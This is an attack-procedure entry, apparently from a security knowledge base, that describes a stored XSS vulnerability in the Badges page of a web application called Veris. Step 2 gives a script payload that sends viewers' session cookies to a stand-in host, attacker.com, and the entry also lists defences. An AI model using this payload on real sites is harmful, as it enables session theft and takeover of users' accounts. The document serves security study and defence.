---
id: proc-veris-inject-xss-badges
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.834Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Badges-Table

## Summary

This procedure exploits insufficient input sanitization in the Veris application's Badges page data table to inject and store a malicious JavaScript payload, which persists and executes for all subsequent viewers of the page.

## Description

In the Veris application, user-supplied data for badges (e.g., names, descriptions) is stored without proper escaping and displayed in a data table on the Badges page. An attacker with basic user access can submit HTML/JavaScript payloads via input forms or API endpoints. Upon storage, the payload is rendered unsafely in users' browsers, leading to client-side execution. This stored XSS enables attacks like stealing session cookies, keylogging, or phishing. The vulnerability was reported in 2016 and affects web-based environments.

## Requirements

1. Valid user account in the Veris application with permission to submit badge data
2. Access to the Badges page input interface (form or API)
3. Web browser for testing payload submission

## Defense

Defensive measures and detection strategies:

- Implement server-side input validation and HTML escaping (e.g., using libraries like DOMPurify)
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution or unexpected network requests from the application

## Objectives

1. Store malicious JavaScript in the Badges data table
2. Ensure payload persists across sessions and users
3. Prepare for execution to steal sensitive data like cookies

## Instructions

### Step 1: Identify Injection Point

**Context**: Locate the vulnerable input field on the Badges page, such as a badge description or metadata form.

Navigate to the Badges creation or editing interface in Veris.

### Step 2: Craft and Submit Payload

**Context**: Create a payload that evades basic filters and achieves the desired impact, then submit it.

Use a payload like `<script>fetch('http://attacker.com/log?data='+encodeURIComponent(document.cookie))</script>` for cookie exfiltration. Submit via the form.

> If the application uses POST requests, intercept with a proxy to modify inputs.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored by viewing the Badges page as the same user.

Reload the Badges page and inspect the data table source for the injected script.

**Expected Output**: Raw script tag visible in HTML source without execution (yet).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
